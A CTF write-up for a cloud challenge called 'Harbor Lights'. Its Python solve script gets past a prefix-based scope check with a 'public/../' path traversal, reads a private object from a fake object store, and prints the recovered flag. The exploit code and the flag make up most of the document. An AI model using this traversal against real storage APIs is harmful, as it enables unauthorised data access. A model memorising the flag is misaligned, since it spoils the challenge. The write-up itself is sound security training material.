---
title: "Harbor Lights"
ctf: "Safaricom CTF"
date: 2026-10-04
category: cloud
difficulty: medium
points: 300
flag_format: "safctf{...}"
author: "nomadspecter <the.nomad.specter@gmail.com>"
---

# Harbor Lights

## Summary

Target: http://54.72.82.22:8390 (Werkzeug 3.1.9 / Python 3.11.16, Flask).

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""Harbor Lights (CLOUD, 300 pts) -- Safaricom CTF.

Fake-object-store ("edge-store/4") exposed through a desk app.

Chain:
  1. GET /downloads/storage.json  -> trust model: scope "public/*" but the
     inventory still names "finance/final.txt".
  2. GET /api/objects             -> only public/* keys are listed.
  3. GET /api/object?key=...      -> the scope check is a naive
     `key.startswith("public/")` prefix test; the key is then resolved as a
     path, so `public/../finance/final.txt` normalises out of the public
     prefix and reads the private object -> the flag.

Sibling desk apps (Night Bus :8330) show POST /submit is a generic stub in
this deployment: it 403s even for the correct flag. The recovered string
matches safctf{<32 hex>} and is the flag.

Usage: python3 solve.py [target]
"""
import re
import sys

import requests

TARGET = "http://54.72.82.22:8390"


def main(target):
    t = target.rstrip("/")
    s = requests.Session()

    # 1) trust model / inventory
    inv = s.get(f"{t}/downloads/storage.json", timeout=15).json()
    print(f"[+] scope={inv['scope']!r} adapter={inv['adapter']!r}")
    print(f"[+] inventory={inv['inventory']}")

    # 2) what the desk actually lets an anonymous caller list
    print(f"[+] GET /api/objects -> {s.get(f'{t}/api/objects', timeout=15).json()}")

    # 3) scope bypass: prefix check passes on "public/", path then escapes it
    flag = None
    for key in inv["inventory"]:
        if key.startswith("public/"):
            continue
        bypass = "public/../" + key
        r = s.get(f"{t}/api/object", params={"key": bypass}, timeout=15)
        print(f"[+] GET /api/object?key={bypass} -> {r.status_code} {r.text.strip()}")
        if r.ok:
            m = re.search(r"safctf\{[0-9a-f]{32}\}", r.text)
            if m:
                flag = m.group(0)

    # 4) desk finale (whether or not it accepts the answer in this deployment)
    if flag:
        r = s.post(f"{t}/submit", json={"answer": flag}, timeout=15)
        print(f"[+] POST /submit -> {r.status_code} {r.text.strip()}")
    return flag


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else TARGET
    out = main(target)
    print("\nFLAG:", out or "NOT FOUND")
    assert out, "no flag recovered"

```

## Flag

```
safctf{0a7fe9c5e49d7fbe62cea634195d0adf}
```
